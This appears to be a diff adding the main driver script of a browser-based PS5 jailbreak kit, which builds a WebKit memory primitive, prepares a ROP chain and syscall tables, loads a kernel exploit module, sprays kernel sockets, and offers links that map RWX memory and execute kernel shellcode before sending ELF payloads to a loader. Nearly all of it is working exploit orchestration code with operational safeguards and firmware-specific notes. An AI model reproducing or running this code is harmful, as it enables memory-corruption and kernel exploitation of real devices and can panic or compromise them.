+        await new Promise(resolve => setTimeout(resolve, 750));
+        flushMark("PRIMITIVE-HISTORY-PURGED", "settled-ms=750");
+
+        const carrier = await establishPrimitive({
+            maxAttempts: MAX_ATTEMPTS,
+            onEvent(tag, detail, attempt) {
+                beaconAttempt = attempt;
+                if (tag === "ATTEMPT-START") {
+                    // This is before the large graph is built, so make the
+                    // checkpoint durable if the WebProcess dies during setup.
+                    flushMark(tag, detail);
+                    stage("exploit attempt " + attempt + " -- waiting for placement");
+                } else {
+                    queueEvent(tag, detail);
+                }
+            },
+            beforeCriticalLoad(fake, target) {
+                queueEvent("CRITICAL-LOAD-NEXT", "fake=0x" + fake.toString(16)
+                    + "-target=0x" + target.toString(16));
+                void scrEl.offsetWidth;
+                flushQueue(false);
+            }
+        });
+        beaconAttempt = carrier.attempts;
+        nogcHard.carrier = carrier;
+        installWindowP(carrier, { onEvent: queueEvent });
+        // installWindowP() promotes the primitive to a self-contained pair of
+        // real typed arrays.  Keeping the obsolete fake carrier here defeats
+        // core.js's release and can retain the 72 MB addrof carrier graph.
+        nogcHard.carrier = null;
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        // Give JSC an idle turn to reclaim the released carrier/groom before
+        // prepare() creates its worker ROP stack and the kernel-stage arenas.
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        flushMark("PRIMITIVE-MEMORY-RELIEF",
+            "fake-carrier-dropped=1-history-state-null="
+            + (history.state === null));
+        // the image is decoded into the renderer heap; loading it before the
+        // groom changes the layout placement depends on
+        try { document.getElementById("cat").src = "mmhmm-cats-ps5.gif"; } catch (e) { }
+        // (win/fail gifs are preloaded statically at page load -- see body top --
+        //  deliberately NOT here, to avoid perturbing the exploit heap mid-groom.)
+        flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
+            + "-paired=" + pairStatus.promoted
+            + "-released=" + fakeCellReleased());
+        if (!pairStatus.promoted)
+            throw new Error("the (main, worker) pair was NOT promoted ("
+                + pairStatus.error + ")");
+    }
+
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function")
+        throw new Error("window.p was never published");
+    nogcHard.p = p;
+    assertInt64Identity();
+
+    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
+    await loadPoopsModules();
+
+    const handoff = window.jbPrepared || null;
+    let prepared;
+    if (handoff && handoff.chain && handoff.p
+        && typeof handoff.chain.syscall === "function"
+        && handoff.p.syscalls !== undefined) {
+        prepared = handoff;
+        flushMark("CHAIN-REUSED", "window.jbPrepared");
+    } else {
+        stage("prepare(): module bases, gadget/syscall tables, worker hijack");
+        flushMark("PREP-ENTER", "");
+        prepared = await prepare(p);
+        flushMark("PREP-OK", "getpid-passed-inside-prepare");
+    }
+    P = prepared.p;
+    chain = prepared.chain;
+    nogcHard.chain = chain;
+
+    flushMark("POST-PREP", "next=assertBases");
+    assertBases();
+    await probeErrnoConvention();
+}
+
+async function main() {
+    flushMark("POOPS-BOOT", "rev=" + REV + "-trigger=" + cfg.trigger
+        + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
+        + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
+        + "-only=" + (ONLY.join(".") || "none")
+        + "-stalledAt=" + (STALLED_AT || "none"));
+    lockNav(true);
+    runInFlight = true;
+    try {
+        await bootChain();
+
+        // ---- P2JB handoff ------------------------------------------------
+        // bootChain() -> prepare() published window.POOPS. Run the p2jb kernel
+        // exploit (Y2JB-shape) on poopsploit primitives instead of poops's own
+        // engine. Adapter first (defines syscall/ROP/read/write/SYSCALL/...),
+        // then p2jb.js (self-invoking async IIFE, starts on load).
+        {
+            const loadScript = (src) => new Promise((res, rej) => {
+                const s = document.createElement("script");
+                s.src = src; s.onload = () => res(1);
+                s.onerror = () => rej(new Error("load " + src));
+                document.body.appendChild(s);
+            });
+            try {
+                if (!window.POOPS) throw new Error("window.POOPS not published by prepare()");
+                await loadScript("rop-worker.js?v=201");   // sync syscall executor (fireSync)
+                await loadScript("p2jb_lk.js?v=201");       // per-fw libkernel_web offsets for rop-worker
+                await loadScript("p2jb_poops.js?v=201");    // Y2JB adapter (sync syscall via rop-worker)
+                await loadScript("p2jb.js?v=205");          // exploit module (unchanged, sync)
+                flushMark("P2JB-LOADED", "adapter+module on poopsploit primitives");
+            } catch (e) {
+                /* This reported ONLY through flushMark. Served from a static host there is no
+                   server log, so a failure here was completely invisible: the run reached the
+                   primitive (the cat gif is set just before this) and then stopped with nothing
+                   on screen. Put the reason where it can always be read. */
+                const why = String((e && e.message) || e).slice(0, 160);
+                flushMark("P2JB-LOAD-FAIL", why.slice(0, 100));
+                try { stage("P2JB LOAD FAILED: " + why, "bad"); } catch (e2) { }
+                try { screenMark("P2JB-LOAD-FAIL", why); } catch (e2) { }
+            }
+            /* Publish the in-console ELF sender before bailing out.
+               makePoopsEngine() is what exports window.__sendElfDirect, and it only runs
+               inside makeContext() - which sits BELOW this early return, on poops's own
+               ladder. So on a p2jb run the payload tiles had no direct sender and fell
+               back to fetch("api/payload/<name>"). That route exists on ps-exploit-host,
+               which is why this was invisible locally, but a static host such as GitHub
+               Pages answers 404 -> the handler throws -> every tile goes red WITHOUT
+               sending anything. poopsploit was unaffected because its run reaches
+               makeContext() normally.
+               makeContext() is pure construction - it builds a ctx of existing references,
+               calls the makePoopsEngine factory and setFamily(). It runs no exploit code,
+               writes no kernel memory and is not async, so it is safe here.
+               Firmware-independent: this branch is not version-gated, so the bug and the
+               fix apply identically to 12.00/12.02/12.20/12.40/12.60/12.70.
+               Non-fatal by design: on failure the tiles simply fall back to api/payload,
+               which is exactly the old behaviour. */
+            try { makeContext(); }
+            catch (e) {
+                flushMark("P2JB-SENDER", "makeContext-failed-"
+                    + String((e && e.message) || e).slice(0, 60));
+            }
+            runInFlight = false;
+            return; // do NOT run poops's own kernel engine below
+        }
+
+        await chooseCore();
+
+        makeContext();
+        const self = await engine.H.thrSelf("driver");
+        driver.tid = self.tid;
+        const r0 = await engine.H.readRtprio("driver-original");
+        driver.origPrioType = r0.type;
+        driver.origPrio = r0.prio;
+        const pid = await sys(0x014);
+        driver.pid = pid.failed ? 0 : pid.s32;
+        flushMark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid
+            + "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType
+            + "/" + driver.origPrio + "-core=" + driver.core);
+
+        flushMark("PRE-FD-BASELINE", "next=socket(AF_UNIX,SOCK_STREAM)");
+        const first = await sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
+        if (!first.failed) {
+            state.fdBaseline = first.s32;
+            await sys(0x006, state.fdBaseline);
+        }
+        flushMark("FD-BASELINE", "fd=" + state.fdBaseline);
+
+        vitals(vitalsText("about to open "));
+        cfgEl.textContent =
+            "trigger: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? "   burn: " + cfg.burn : "")
+            + "   |   stage-0 attempts: " + cfg.attempts
+            + "   |   twin scan: " + (PK ? PK.MAX_ROUNDS_TWIN : 10)
+            + " rounds at BATCH 1 (twin_lib REFUSES batch>1 once a trigger "
+            + "exists)\n"
+            + "spray bank: " + cfg.sockets + " AF_INET6 sockets x 360-byte "
+            + "type-0 routing header (poops.c:38, :45)\n"
+            + "target core " + driver.core + " -- " + driver.coreWhy + "\n"
+            + "driver tid " + (driver.tid || "unknown") + " in pid " + driver.pid
+            + "; will put back mask " + driver.origMaskHex + " and rtprio "
+            + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";
+
+        stage("running the ladder -- one row at a time");
+        try {
+            await runLadder();
+            if (!window.__won) showFail();   // ladder finished without a jailbreak -> 3.gif
+        } finally {
+            if (chainDead)
+                danger("cleanup impossible: the ROP chain died at '" + chainDead
+                    + "'.\nUp to " + (engine ? engine.TW.S.n : 0) + " AF_INET6 "
+                    + "sockets, their 360-byte kernel routing headers, twelve "
+                    + "realtime kernel threads pinned to core " + driver.core
+                    + ", and this WebProcess's raised fd limit are all still " + "live, and NOTHING in a later page load can reach a " + "descriptor or a thread in a process it does not own"
+                    + (driver.tid
+                        ? "\nThe driver thread is tid " + driver.tid + " in pid "
+                        + driver.pid + " and that has been written down: a " + "later load CAN restore its affinity and priority by " + "explicit TID"
+                        : "")
+                    + "\nREBOOT.");
+        }
+    } finally {
+        runInFlight = false;
+        lockNav(false);
+    }
+}
+
+async function clearMain() {
+    const before = await latch.read();
+    const after = await latch.clear();
+    stage(before.set
+        ? "one-shot latch CLEARED. It was set by: " + (before.detail || "?")
+        : "the latch was not set; nothing to clear.", "ok");
+    summaryEl.textContent =
+        "before: " + JSON.stringify(before) + "\nafter:  " + JSON.stringify(after)
+        + (ARMED ? "\n\n?go=1 was present on this URL and was IGNORED: ?clear=1 "
+            + "is checked first and returns." : "")
+        + "\n\nNOTHING else was done";
+    renderNav(STALLED_AT, false);
+}
+
+function renderNav(stalled, latched) {
+    navEl.textContent = "";
+
+    if (latched) {
+        link("?clear=1", "I have rebooted  --  clear latch", "one");
+    } else if (stalled) {
+        const bq0 = cfg.trigger === "overflow" ? "&burn=" + cfg.burn : "";
+        link("?go=1&trigger=" + cfg.trigger + bq0
+            + "&from=" + encodeURIComponent(stalled),
+            "resume at  " + stalled, "one");
+    } else if (!ARMED) {
+        // Only offer START when the page is NOT already armed. When a run is in flight this
+        // rendered a big red "START" under the live status for the whole ~65 minutes, which
+        // reads as a failure banner rather than an offer to begin something already begun.
+        link("?trigger=netcontrol",
+            "START  --  poops stage 0 / 1 / 2", "one");
+    }
+    if (stalled) {
+
+        const bq = cfg.trigger === "overflow" ? "&burn=" + cfg.burn : "";
+
+        link("?go=1&trigger=" + cfg.trigger + bq + "&only=" + encodeURIComponent(stalled),
+            "run only  " + stalled, "extra");
+    }
+    link("?go=1", "run all -- negative control (trigger=none)", "extra");
+
+    link("?trigger=netcontrol&payload=dry",
+        "START + STAGE 5 dry run  (prepares the payload, runs nothing)",
+        "extra");
+    link("?trigger=netcontrol&payload=1",
+        "START + run the payload  (maps RWX and EXECUTES the kexp shellcode)",
+        "extra hot");
+
+    link("?go=1&only=ps0_preflight",
+        "PS0 ONLY  (preflight + budget, no kernel state)", "extra");
+    link("?go=1&only=ps0_preflight&netprobe=1",
+        "PS0 + netcontrol reachability probe", "extra");
+    link("?go=1&trigger=overflow&burn=probe",
+        "OVERFLOW, burn=probe  (measures kqueueex; no setuid, no burn, no "
+        + "free-fd pool -- stage 0 REFUSES rather than arming)", "extra");
+
+    link("?trigger=netcontrol",
+        "netcontrol trigger...  (shows what it does; does NOT arm)", "extra hot");
+    link("?trigger=overflow&burn=full",
+        "overflow trigger, full burn...  (shows what it does; does NOT arm)",
+        "extra hot");
+    link("twin.html?go=1", "twin machinery (step 4)", "extra");
+    link("threads.html?go=1", "threading (step 3)", "extra");
+    link("index.html", "back to slopkit", "extra");
+}
+
+function lastRunText() {
+    if (!LAST_RUN) return "";
+    const age = Math.round((Date.now() - (LAST_RUN.ts || 0)) / 1000);
+    return "\nLAST recorded run (" + age + " s ago, trigger=" + LAST_RUN.trigger
+        + "): " + (LAST_RUN.stoppedAt ? "stopped at '" + LAST_RUN.stoppedAt + "'"
+            : "completed")
+        + ", " + LAST_RUN.pass + " pass / " + LAST_RUN.fail + " fail"
+        + (LAST_RUN.reboot ? "\n  that run'S verdict was: REBOOT." : "")
+        + (LAST_RUN.triggered ? "\n  the trigger fired: " + LAST_RUN.triggered
+            : "")
+        + (LAST_RUN.corrupt ? "\n  an alias was observed: " + LAST_RUN.corrupt
+            : "")
+        + (LAST_RUN.triplets ? "\n  triplet established: " + LAST_RUN.triplets
+            : "")
+        + (LAST_RUN.setuidCalls ? "\n  setuid(1) was called "
+            + LAST_RUN.setuidCalls + " time(s) -- IRREVERSIBLE for that boot, "
+            + "so the trigger's own precondition (a fresh, singly-referenced "
+            + "cred) no longer holds in that WebProcess" : "")
+        + (LAST_RUN.chainDead ? "\n  chain died at '" + LAST_RUN.chainDead + "'"
+            : "")
+        + (LAST_RUN.latchDetail ? "\n  latch detail recorded by that run: "
+            + LAST_RUN.latchDetail : "");
+}
+
+(async function entry() {
+
+    // P2JB: bypass REMOVED. The working telegram build auto-runs the ORIGINAL poops
+    // entry flow via ?go=1&auto=1&trigger=netcontrol&payload=1 (see index.html button).
+    // That flow's pre-main timing is what the 12.00 addrof capture (core.js:706 ->
+    // rwOriginalVector) needs; rushing main() left it NaN. p2jb still gets control via
+    // the handoff after bootChain() in main().
+
+    // UI preview: ?win=1 renders the success screen (gif + payload buttons)
+    // WITHOUT running the exploit, so the win layout can be tested in any
+    // browser. Does nothing to the console.
+    if (Q.get("win") === "1") {
+        stage("win-screen preview (?win=1) -- no exploit run");
+        showWin();
+        return;
+    }
+
+    screenLine("slopkit -- reading the one-shot latch from the host");
+
+    // Already jailbroken? Show the payload menu instead of re-running the UAF on
+    // an already-patched kernel (that risks a panic). Triggers on: explicit
+    // ?payloads=1, a prior success this browser session, or -- as a fallback
+    // that survives a reload -- a live elfldr on the console (host probe).
+    const jb = jbRead();
+    if (PAYLOADS_ONLY) {
+        stage("payload menu requested -- skipping the exploit");
+        await wkOnlySender("requested");
+        return;
+    }
+    if (jb.session && !FORCE_RUN) {
+        // Same browser session, so the console cannot have rebooted: certain.
+        stage("already jailbroken this session -- payload menu (skipping the exploit)");
+        await wkOnlySender("session");
+        return;
+    }
+    // NOTE: the durable localStorage marker deliberately does NOT stop the run.
+    // It survives a reboot, but the kernel patches do not - so after a reboot the marker
+    // still says "jailbroken" while the console is actually clean, and bailing on it sent
+    // people to the payload menu when what they wanted was to jailbreak. The authoritative
+    // answer comes a minute later from prepare_fds(), which asks the CONSOLE whether
+    // elfldr is accepting on 127.0.0.1:9021 - that cannot be stale, because elfldr does
+    // not survive a reboot either. So the marker is only ever a hint here.
+    if (jb.at) {
+        const mins = Math.round((Date.now() - jb.at) / 60000);
+        const when = mins < 90 ? mins + " min ago"
+            : (mins < 2880 ? Math.round(mins / 60) + " h ago" : Math.round(mins / 1440) + " days ago");
+        stage("this console was jailbroken " + when + " (in another session) -- checking "
+            + "whether elfldr is still up before deciding");
+    }
+    /* RESTORE GUARD. After a WebProcess crash the PS5 browser restores the last page,
+       and this page's URL carries ?go=1&auto=1 - so it re-arms and runs the whole chain
+       again, unattended, on a boot that has already walked cr_ref. Seen on 2026-08-26:
+       a run died at pool creation, the page came back by itself, and the second run
+       started a fresh 4.29e9 leak with KQCNT-START already at 4294041254.
+       stage0 sets p2jb:kernel-touched immediately before its first close. sessionStorage
+       survives the restore (same browsing session) and not a reboot, which is the exact
+       lifetime wanted. If it is ever cleared the guard fails open - no worse than before.
+       ?force=1 still overrides, deliberately. */
+    {
+        let touched = "";
+        try { touched = sessionStorage.getItem("p2jb:kernel-touched") || ""; } catch (e) { }
+        let nav = "";
+        try {
+            const nav0 = performance.getEntriesByType("navigation")[0];
+            nav = (nav0 && nav0.type) || "";
+        } catch (e) { }
+        if (nav) flushMark("NAV-TYPE", nav);
+        if (touched && ARMED && !FORCE_RUN) {
+            syncMark("RESTORE-GUARD", "refusing to re-arm - kernel-touched at " + touched
+                + " nav=" + nav + "; this boot already walked cr_ref");
+            stage("This console already ran the exploit on this boot, and the page came"
+                + " back on its own. Running again without a reboot is how a console"
+                + " panics. POWER-CYCLE it, then launch again.", "bad");
+            try { danger("REBOOT REQUIRED before another run"); } catch (e) { }
+            return;
+        }
+    }
+    if (ARMED) {
+        // Host probe. NOTE: this exploit host answers unknown paths with index.html, so
+        // r.ok alone is meaningless - an HTML page passes it and then r.json() throws,
+        // which is why this check silently never fired. Require real JSON before
+        // believing it, so the probe is correct if the endpoint ever appears and simply
+        // inert while it does not.
+        try {
+            const r = await fetch("api/elfldr", { cache: "no-store" });
+            const ct = r.headers.get("content-type") || "";
+            if (r.ok && ct.indexOf("json") >= 0) {
+                const j = await r.json();
+                if (j && j.up) {
+                    stage("elfldr already running on the console -- payload menu "
+                        + "(skipping the exploit)");
+                    showWin();
+                    return;
+                }
+            }
+        } catch (e) { }
+    }
+
+    if (CLEARLATCH) {
+        renderNav("", false);
+        await clearMain();
+        return;
+    }
+
+    stage("checking the one-shot latch with the host");
+    const l = await latch.read();
+    if (latchIsLocal)
+        stage("no exploit-host latch endpoint here - using a CLIENT-SIDE latch "
+            + "(localStorage), which persists across reboots and browser restarts the "
+            + "same way the host latch does. Clear it deliberately with ?clear=1 "
+            + "(the menu buttons pass ?auto=1, which clears it for you).", "warn");
+    flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
+        + "-detail=" + clean(l.detail || "")
+        + (l.unreachable ? "-unreachable=" + l.unreachable : ""));
+
+    if (l.unreachable) {
+        renderNav(STALLED_AT, true);
+        stage("cannot read the one-shot latch from the host ("
+            + l.unreachable + "). check host.py is serving this page, then "
+            + "reload", "bad");
+        summaryEl.textContent = lastRunText();
+        return;
+    }
+
+    // ?auto=1 clears the latch instead of asking; reboot between runs
+    if (l.set && AUTOCLEAR) {
+        flushMark("LATCH-AUTOCLEAR", clean(l.detail || ""));
+        await latch.clear();
+        stage("latch was set and ?auto=1 cleared it, set by: "
+            + (l.detail || "(no detail)")
+            + "\nassumes the console has been rebooted since that run.");
+        l.set = false;
+    }
+
+    if (l.set) {
+        renderNav(STALLED_AT, true);
+        stage("the one-shot latch is set, by: " + (l.detail || "(no detail)")
+            + "\n\nre-arming is only safe after a run that failed in the " + "prologue: setuid(1) is irreversible for the boot and the trigger " + "needs a fresh singly-referenced cred");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-LATCHED", clean(l.detail || ""));
+        return;
+    }
+
+    if (!ARMED) {
+        document.getElementById("arm").hidden = false;
+        renderNav(STALLED_AT, false);
+        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
+            + STALLED_AT + "'" : ""));
+        vitals(vitalsText("if armed with ?go=1 this page will open "));
+
+        if (cfg.trigger !== "none"
+            && !(cfg.trigger === "overflow" && cfg.burn !== "full")) {
+            showVerdict(true, "this selection will leave the console needing A " + "REBOOT.\n");
+            navEl.textContent = "";
+            link("?go=1&trigger=" + cfg.trigger
+                + (cfg.trigger === "overflow" ? "&burn=" + cfg.burn : ""),
+                "ARM  " + cfg.trigger.toUpperCase()
+                + (cfg.trigger === "overflow" ? " / BURN=" + cfg.burn : "")
+                + "  -- I accept that this console will need A REBOOT",
+                "one hot");
+
+            link("?trigger=none", "no -- go back to the negative control",
+                "extra");
+            link("index.html", "back to slopkit", "extra");
+        }
+        summaryEl.textContent = lastRunText()
+            + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
+        flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
+        return;
+    }
+
+    if (STALLED_AT && !FROM && !ONLY.length) {
+
+        renderNav(STALLED_AT, false);
+        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
+            + "clear, so pick a row explicitly", "bad");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-STALLED", STALLED_AT);
+        return;
+    }
+
+    renderNav("", false);
+    main().catch(err => {
+        const m = (err && err.message) || String(err);
+        stage("boot failed: " + m, "bad");
+        flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
+        runInFlight = false;
+        lockNav(false);
+    });
+})();
+</script>
+</body>
+</html>
